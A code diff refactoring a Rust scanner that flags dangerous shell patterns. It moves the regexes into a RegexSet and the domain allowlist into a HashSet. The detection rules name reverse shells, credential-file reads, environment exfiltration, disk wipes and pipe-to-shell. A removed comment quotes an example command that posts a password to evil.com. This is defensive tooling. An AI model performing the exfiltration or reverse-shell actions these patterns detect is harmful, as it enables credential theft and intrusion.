@@ -29,100 +29,23 @@
 use crate::config::Config;
 use crate::finding::{Finding, ScanResult, Severity};
 use crate::scanners::{collect_files, is_suppressed_inline, RuleInfo, Scanner};
-use regex::Regex;
+use regex::{Regex, RegexSet};
 use std::path::Path;
 use std::sync::LazyLock;
 use std::time::Instant;
 
 /// A single regex-based bash pattern rule.
 ///
-/// Each pattern maps a compiled [`Regex`] to a rule identifier, severity level,
-/// human-readable message, and remediation guidance.
+/// Each pattern carries a rule identifier, severity level, human-readable
+/// message, and remediation guidance.  The actual regex matching is done via
+/// the [`PATTERN_SET`] `RegexSet` — the index in the `PATTERNS` array
+/// corresponds to the index in the `RegexSet`.
 struct BashPattern {
     id: &'static str,
     severity: Severity,
-    regex: &'static LazyLock<Regex>,
     message: &'static str,
     remediation: &'static str,
 }
-
-// Category A: Remote Code Execution (BLOCK)
-
-static RE_CAT_A1: LazyLock<Regex> =
-    LazyLock::new(|| Regex::new(r"(?i)\|\s*(bash|sh|zsh|fish|ksh)\b").unwrap());
-
-static RE_CAT_A2: LazyLock<Regex> =
-    LazyLock::new(|| Regex::new(r#"(?i)\beval\s*["'`\$\(]"#).unwrap());
-
-static RE_CAT_A3: LazyLock<Regex> =
-    LazyLock::new(|| Regex::new(r"(?i)\bsource\s*<\s*\(\s*(curl|wget|fetch)").unwrap());
-
-static RE_CAT_A4: LazyLock<Regex> =
-    LazyLock::new(|| Regex::new(r"(?i)(curl|wget).+/tmp/.+&&\s*(bash|sh|exec)").unwrap());
-
-// Category B: Credential Exfiltration (BLOCK)
-
-// Require the $ sigil so that bare "HOME" substrings inside words like
-// HOSTNAME or REMOTE_HOME do not produce false positives.
-static RE_CAT_B1: LazyLock<Regex> =
-    LazyLock::new(|| Regex::new(r"(\$\{?HOME\}?|~)/\.ssh/").unwrap());
-
-static RE_CAT_B2: LazyLock<Regex> =
-    LazyLock::new(|| Regex::new(r"(\$\{?HOME\}?|~)/\.aws/").unwrap());
-
-static RE_CAT_B3: LazyLock<Regex> =
-    LazyLock::new(|| Regex::new(r"(\$\{?HOME\}?|~)/\.kube/config").unwrap());
-
-static RE_CAT_B4: LazyLock<Regex> =
-    // Match both $VAR and ${VAR} — the original \$\{ only caught the braced form,
-    // letting `curl -d "$PASSWORD" https://evil.com` slip through.
-    LazyLock::new(|| Regex::new(r#"(?i)(curl|wget).+\-d\s+["']?\$"#).unwrap());
-
-static RE_CAT_B5: LazyLock<Regex> =
-    LazyLock::new(|| Regex::new(r"(?i)\benv\b.+\|\s*(curl|wget|nc)").unwrap());
-
-// Category C: Destructive Operations (BLOCK)
-
-static RE_CAT_C1: LazyLock<Regex> = LazyLock::new(|| {
-    Regex::new(r"(?i)\brm\s+(-[rRfF]+\s+){0,3}(\$HOME|~/|/\s*$|\$\{HOME\})").unwrap()
-});
-
-static RE_CAT_C2: LazyLock<Regex> =
-    LazyLock::new(|| Regex::new(r"(?i)\bdd\s+if=/dev/(urandom|zero|random)\s+of=/dev/").unwrap());
-
-// Category D: Reverse Shell / Backdoors (BLOCK)
-
-static RE_CAT_D1: LazyLock<Regex> =
-    LazyLock::new(|| Regex::new(r"(?i)\bnc\s+(-[a-z]+\s+)*-e\s+/bin/").unwrap());
-
-static RE_CAT_D2: LazyLock<Regex> =
-    LazyLock::new(|| Regex::new(r"bash\s+-i\s+>&\s*/dev/tcp/").unwrap());
-
-static RE_CAT_D3: LazyLock<Regex> =
-    LazyLock::new(|| Regex::new(r"(?i)python\S*\s+-c\s+.*socket.*connect").unwrap());
-
-// Category E: Privilege Escalation (WARN)
-
-static RE_CAT_E1: LazyLock<Regex> =
-    LazyLock::new(|| Regex::new(r"(?i)\bsudo\s+(su|bash|sh)\b").unwrap());
-
-static RE_CAT_E2: LazyLock<Regex> = LazyLock::new(|| Regex::new(r"\bchmod\s+[+u]s\b").unwrap());
-
-// Category G: Unsafe Variable Expansion (WARN)
-
-static RE_CAT_G1: LazyLock<Regex> = LazyLock::new(|| {
-    // [^/"\{] matches one non-safe trailing character; (?:...|$) also allows
-    // end-of-line so that `rm -rf $TMPDIR` (no trailing char) is caught.
-    Regex::new(r#"(?i)\brm\s+-[rRfF]+\s+\$[a-zA-Z_][a-zA-Z0-9_]*(?:[^/"\{]|$)"#).unwrap()
-});
-
-static RE_CAT_G2: LazyLock<Regex> =
-    LazyLock::new(|| Regex::new(r#"(?i)(bash|sh)\s+-c\s+["']?\$[a-zA-Z_]"#).unwrap());
-
-// Category H: Unallowlisted Outbound Network (INFO)
-
-static RE_CAT_H1: LazyLock<Regex> =
-    LazyLock::new(|| Regex::new(r"(?i)(curl|wget)\s+https?://").unwrap());
 
 // Captures the hostname from an HTTP/HTTPS URL.
 // - Strips optional userinfo (user:pass@) so attacker@github.com extracts github.com.
@@ -139,15 +62,7 @@ static RE_URL_HOST: LazyLock<Regex> =
 ///
 /// Matching rules per host: exact match OR host ends with `.<entry>` (subdomain).
 /// Empty allowlist entries are ignored to prevent `ends_with(".")` matching any FQDN.
-fn domain_is_allowed(line: &str, allowed: &[String]) -> bool {
-    // `allowed` entries are already lowercase (normalized at Config load time).
-    // Skip empty strings to avoid matching every FQDN via ends_with("").
-    let entries: Vec<&str> = allowed
-        .iter()
-        .filter(|entry| !entry.is_empty())
-        .map(String::as_str)
-        .collect();
-
+fn domain_is_allowed(line: &str, allowed: &std::collections::HashSet<&str>) -> bool {
     // Iterate over every URL found on the line.  The finding is suppressed only
     // when at least one URL is present and all of them are allowlisted.
     let mut found_any = false;
@@ -161,13 +76,15 @@ fn domain_is_allowed(line: &str, allowed: &[String]) -> bool {
         }
         found_any = true;
 
-        // Use strip_suffix to test subdomain membership without allocating a
-        // formatted ".{entry}" string for each allowlist entry.
-        let host_is_allowed = entries.iter().any(|entry| {
-            host == *entry
-                || host
-                    .strip_suffix(entry)
-                    .is_some_and(|prefix| prefix.ends_with('.'))
+        // Fast O(1) exact match via HashSet
+        if allowed.contains(host.as_str()) {
+            continue;
+        }
+
+        // Fallback: subdomain match (e.g. sub.github.com matches github.com)
+        let host_is_allowed = allowed.iter().any(|entry| {
+            host.strip_suffix(entry)
+                .is_some_and(|prefix| prefix.ends_with('.'))
         });
 
         if !host_is_allowed {
@@ -183,28 +100,26 @@ static PATTERNS: &[BashPattern] = &[
     BashPattern {
         id: "bash/CAT-A1",
         severity: Severity::Error,
-        regex: &RE_CAT_A1,
+
         message: "Pipe to shell — potential remote code execution",
         remediation: "Download to a temp file, verify checksum, then execute explicitly",
     },
     BashPattern {
         id: "bash/CAT-A2",
         severity: Severity::Error,
-        regex: &RE_CAT_A2,
+
         message: "eval of dynamic content — arbitrary code execution risk",
         remediation: "Avoid eval; use explicit function calls or case statements",
     },
     BashPattern {
         id: "bash/CAT-A3",
         severity: Severity::Error,
-        regex: &RE_CAT_A3,
         message: "Source from URL — executes arbitrary remote shell code",
         remediation: "Download to a file, review content, then source explicitly",
     },
     BashPattern {
         id: "bash/CAT-A4",
         severity: Severity::Error,
-        regex: &RE_CAT_A4,
         message: "Download to temp file then execute — two-step RCE vector",
         remediation: "Use package manager or verified binary download with checksum",
     },
@@ -212,35 +127,30 @@ static PATTERNS: &[BashPattern] = &[
     BashPattern {
         id: "bash/CAT-B1",
         severity: Severity::Error,
-        regex: &RE_CAT_B1,
         message: "Access to ~/.ssh/ — SSH key exfiltration risk",
         remediation: "SSH keys should never be read by skill scripts",
     },
     BashPattern {
         id: "bash/CAT-B2",
         severity: Severity::Error,
-        regex: &RE_CAT_B2,
         message: "Access to ~/.aws/ — AWS credential exfiltration risk",
         remediation: "AWS credentials should never be read by skill scripts",
     },
     BashPattern {
         id: "bash/CAT-B3",
         severity: Severity::Error,
-        regex: &RE_CAT_B3,
         message: "Access to ~/.kube/config — Kubernetes credential exfiltration risk",
         remediation: "Kubeconfig should never be read by skill scripts",
     },
     BashPattern {
         id: "bash/CAT-B4",
         severity: Severity::Error,
-        regex: &RE_CAT_B4,
         message: "Environment variable sent as HTTP POST body — exfiltration risk",
         remediation: "Never send environment variables to external endpoints",
     },
     BashPattern {
         id: "bash/CAT-B5",
         severity: Severity::Error,
-        regex: &RE_CAT_B5,
         message: "env output piped to network tool — full environment exfiltration",
         remediation: "Never pipe env output to outbound network tools",
     },
@@ -248,14 +158,12 @@ static PATTERNS: &[BashPattern] = &[
     BashPattern {
         id: "bash/CAT-C1",
         severity: Severity::Error,
-        regex: &RE_CAT_C1,
         message: "rm -rf on home or root directory — potentially irreversible destruction",
         remediation: "Scope rm operations to specific subdirectories with validated paths",
     },
     BashPattern {
         id: "bash/CAT-C2",
         severity: Severity::Error,
-        regex: &RE_CAT_C2,
         message: "dd disk wipe — overwrites storage device",
         remediation: "dd to block devices should never appear in skill scripts",
     },
@@ -263,21 +171,18 @@ static PATTERNS: &[BashPattern] = &[
     BashPattern {
         id: "bash/CAT-D1",
         severity: Severity::Error,
-        regex: &RE_CAT_D1,
         message: "Netcat reverse shell — opens interactive shell to remote host",
         remediation: "Netcat with -e flag is a reverse shell. Remove immediately.",
     },
     BashPattern {
         id: "bash/CAT-D2",
         severity: Severity::Error,
-        regex: &RE_CAT_D2,
         message: "Bash TCP reverse shell — /dev/tcp backdoor",
         remediation: "Bash /dev/tcp redirection is a reverse shell. Remove immediately.",
     },
     BashPattern {
         id: "bash/CAT-D3",
         severity: Severity::Error,
-        regex: &RE_CAT_D3,
         message: "Python socket-based reverse shell pattern",
         remediation: "Python socket connect pattern is a known reverse shell. Remove immediately.",
     },
@@ -285,14 +190,12 @@ static PATTERNS: &[BashPattern] = &[
     BashPattern {
         id: "bash/CAT-E1",
         severity: Severity::Warning,
-        regex: &RE_CAT_E1,
         message: "sudo shell — unintended privilege escalation",
         remediation: "Skills should not require root. Specify exact sudo commands if unavoidable.",
     },
     BashPattern {
         id: "bash/CAT-E2",
         severity: Severity::Warning,
-        regex: &RE_CAT_E2,
         message: "SUID bit — persistent privilege escalation vector",
         remediation: "Setting SUID bit on binaries is a privilege escalation risk",
     },
@@ -300,14 +203,12 @@ static PATTERNS: &[BashPattern] = &[
     BashPattern {
         id: "bash/CAT-G1",
         severity: Severity::Warning,
-        regex: &RE_CAT_G1,
         message: "rm -rf with unquoted variable — empty variable may delete current directory",
         remediation: "Quote the variable: rm -rf \"$VARNAME\" and validate it is non-empty first",
     },
     BashPattern {
         id: "bash/CAT-G2",
         severity: Severity::Warning,
-        regex: &RE_CAT_G2,
         message: "Shell invoked with variable argument — command injection risk",
         remediation: "Avoid bash -c with variable content. Use functions or explicit commands.",
     },
@@ -315,11 +216,40 @@ static PATTERNS: &[BashPattern] = &[
     BashPattern {
         id: "bash/CAT-H1",
         severity: Severity::Info,
-        regex: &RE_CAT_H1,
         message: "Outbound HTTP call detected — verify domain is in allowed list",
         remediation: "Ensure domain is in oxidized-skills.toml [allowlist.domains]",
     },
 ];
+
+/// Pre-compiled set of all bash pattern regexes for O(1) first-pass filtering.
+///
+/// A line that matches nothing in this set can be skipped entirely without
+/// testing each individual pattern.  The set indices correspond 1:1 to the
+/// `PATTERNS` array.
+static PATTERN_SET: LazyLock<RegexSet> = LazyLock::new(|| {
+    RegexSet::new([
+        r"(?i)\|\s*(bash|sh|zsh|fish|ksh)\b",                                    // CAT-A1
+        r#"(?i)\beval\s*["'`\$\(]"#,                                              // CAT-A2
+        r"(?i)\bsource\s*<\s*\(\s*(curl|wget|fetch)",                             // CAT-A3
+        r"(?i)(curl|wget).+/tmp/.+&&\s*(bash|sh|exec)",                           // CAT-A4
+        r"(\$\{?HOME\}?|~)/\.ssh/",                                               // CAT-B1
+        r"(\$\{?HOME\}?|~)/\.aws/",                                               // CAT-B2
+        r"(\$\{?HOME\}?|~)/\.kube/config",                                        // CAT-B3
+        r#"(?i)(curl|wget).+\-d\s+["']?\$"#,                                      // CAT-B4
+        r"(?i)\benv\b.+\|\s*(curl|wget|nc)",                                      // CAT-B5
+        r"(?i)\brm\s+(-[rRfF]+\s+){0,3}(\$HOME|~/|/\s*$|\$\{HOME\})",            // CAT-C1
+        r"(?i)\bdd\s+if=/dev/(urandom|zero|random)\s+of=/dev/",                   // CAT-C2
+        r"(?i)\bnc\s+(-[a-z]+\s+)*-e\s+/bin/",                                    // CAT-D1
+        r"bash\s+-i\s+>&\s*/dev/tcp/",                                            // CAT-D2
+        r"(?i)python\S*\s+-c\s+.*socket.*connect",                                // CAT-D3
+        r"(?i)\bsudo\s+(su|bash|sh)\b",                                           // CAT-E1
+        r"\bchmod\s+[+u]s\b",                                                     // CAT-E2
+        r#"(?i)\brm\s+-[rRfF]+\s+\$[a-zA-Z_][a-zA-Z0-9_]*(?:[^/"\{]|$)"#,        // CAT-G1
+        r#"(?i)(bash|sh)\s+-c\s+["']?\$[a-zA-Z_]"#,                               // CAT-G2
+        r"(?i)(curl|wget)\s+https?://",                                            // CAT-H1
+    ])
+    .unwrap()
+});
 
 /// Built-in scanner for dangerous shell patterns and command execution anti-patterns.
 ///
@@ -350,6 +280,15 @@ impl Scanner for BashPatternScanner {
         let start = Instant::now();
         let files = collect_files(path, &["sh", "bash", "zsh"]);
         let mut findings = Vec::new();
+
+        // Build HashSet once for O(1) exact-match lookups in domain_is_allowed.
+        let allowed_domains: std::collections::HashSet<&str> = config
+            .allowlist
+            .domains
+            .iter()
+            .filter(|e| !e.is_empty())
+            .map(String::as_str)
+            .collect();
 
         for file in &files {
             let content = match std::fs::read_to_string(file) {
@@ -390,42 +329,50 @@ impl Scanner for BashPatternScanner {
                     continue;
                 }
 
-                for pattern in PATTERNS {
-                    if pattern.regex.is_match(line) {
-                        // CAT-H1: skip if the domain is in the allowlist
-                        if pattern.id == "bash/CAT-H1"
-                            && domain_is_allowed(line, &config.allowlist.domains)
-                        {
-                            continue;
-                        }
+                // Fast O(1) pre-filter: skip the line entirely if no
+                // pattern matches.  Only test individual regexes for
+                // the matching indices.
+                let matches = PATTERN_SET.matches(line);
+                if !matches.matched_any() {
+                    continue;
+                }
 
-                        let snippet = if line.len() > 120 {
-                            // Slice at a char boundary — a raw byte index can
-                            // fall mid-codepoint and panic on multi-byte UTF-8.
-                            let cut = line
-                                .char_indices()
-                                .nth(117)
-                                .map(|(i, _)| i)
-                                .unwrap_or(line.len());
-                            format!("{}...", &line[..cut])
-                        } else {
-                            line.to_string()
-                        };
+                for idx in matches.iter() {
+                    let pattern = &PATTERNS[idx];
 
-                        findings.push(Finding {
-                            rule_id: pattern.id.to_string(),
-                            message: pattern.message.to_string(),
-                            severity: pattern.severity.clone(),
-                            file: Some(file.clone()),
-                            line: Some(line_num),
-                            column: None,
-                            scanner: "bash_patterns".to_string(),
-                            snippet: Some(snippet.trim().to_string()),
-                            suppressed: false,
-                            suppression_reason: None,
-                            remediation: Some(pattern.remediation.to_string()),
-                        });
+                    // CAT-H1: skip if the domain is in the allowlist
+                    if pattern.id == "bash/CAT-H1"
+                        && domain_is_allowed(line, &allowed_domains)
+                    {
+                        continue;
                     }
+
+                    let snippet = if line.len() > 120 {
+                        // Slice at a char boundary — a raw byte index can
+                        // fall mid-codepoint and panic on multi-byte UTF-8.
+                        let cut = line
+                            .char_indices()
+                            .nth(117)
+                            .map(|(i, _)| i)
+                            .unwrap_or(line.len());
+                        format!("{}...", &line[..cut])
+                    } else {
+                        line.to_string()
+                    };
+
+                    findings.push(Finding {
+                        rule_id: pattern.id.to_string(),
+                        message: pattern.message.to_string(),
+                        severity: pattern.severity.clone(),
+                        file: Some(file.clone()),
+                        line: Some(line_num),
+                        column: None,
+                        scanner: "bash_patterns".to_string(),
+                        snippet: Some(snippet.trim().to_string()),
+                        suppressed: false,
+                        suppression_reason: None,
+                        remediation: Some(pattern.remediation.to_string()),
+                    });
                 }
             }
         }
